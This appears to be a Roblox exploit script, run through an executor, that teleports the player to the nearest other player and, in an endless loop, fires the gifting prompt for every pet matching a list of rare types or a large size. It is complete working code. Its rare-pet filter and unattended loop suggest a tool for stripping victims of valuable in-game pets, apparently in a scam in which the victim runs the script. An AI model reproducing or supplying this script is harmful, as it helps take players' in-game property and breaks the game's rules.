warn("[PETGIFT] Script started")

local DEBUG_TAG = "[PETGIFT]"
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- List of allowed pet types
local ALLOWED_PET_TYPES = {
    "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune", 
    "butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl", 
    "t-rex", "dilophosaurus", "moon cat", "fennec fox", "chicken zombie", 
    "hyacinth macaw", "orange tabby"
}

-- Debug print helper
local function debugPrint(...)
    print(DEBUG_TAG, ...)
end

-- Pet check: Must be a tool with PetType OR Scale > 15
local function isPetTypeMatch(pet)
    if not pet or not pet:IsA("Tool") then return false end

    local petTypeAttr = pet:GetAttribute("PetType")
    if not petTypeAttr then return false end

    local lowerPetType = tostring(petTypeAttr):lower()
    for _, allowed in ipairs(ALLOWED_PET_TYPES) do
        if lowerPetType:find(allowed) then
            return true
        end
    end

    local scale = pet:GetAttribute("Scale")
    if scale and tonumber(scale) and tonumber(scale) > 15 then
        return true
    end

    return false
end

-- Find nearest other player
local function getNearestPlayer()
    local nearest, nearestDist
    local myChar = LocalPlayer.Character
    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myChar.HumanoidRootPart.Position).Magnitude
            if not nearestDist or dist < nearestDist then
                nearestDist = dist
                nearest = plr
            end
        end
    end
    return nearest
end

-- Teleport to target player
local function teleportToPlayer(plr)
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") and plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
    end
end

-- Trigger any proximity prompt in your character
local function fireProximityPromptInCharacter()
    for _, descendant in ipairs(LocalPlayer.Character:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") then
            fireproximityprompt(descendant)
            return
        end
    end
end

-- Give all pets to a single target player
local function giftAllPetsToPlayer(target)
    if not target or not target.Character then
        debugPrint("No target to gift pets to.")
        return
    end

    -- Teleport near target once
    teleportToPlayer(target)
    debugPrint("Gifting all pets to:", target.Name)

    -- Go through backpack pets
    for _, pet in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if isPetTypeMatch(pet) then
            debugPrint("Gifting pet from backpack:", pet.Name)
            pet.Parent = LocalPlayer.Character
            task.wait(0.2)
            fireProximityPromptInCharacter()
            task.wait(0.5)
        end
    end

    -- Go through character pets (if still holding any)
    for _, pet in ipairs(LocalPlayer.Character:GetChildren()) do
        if isPetTypeMatch(pet) then
            debugPrint("Gifting pet from character:", pet.Name)
            fireProximityPromptInCharacter()
            task.wait(0.5)
        end
    end
end

-- Main loop
debugPrint("Starting pet gifting loop")
task.spawn(function()
    while true do
        local target = getNearestPlayer()
        if target then
            giftAllPetsToPlayer(target)
        else
            debugPrint("No players nearby.")
        end
        task.wait(1)
    end
end)
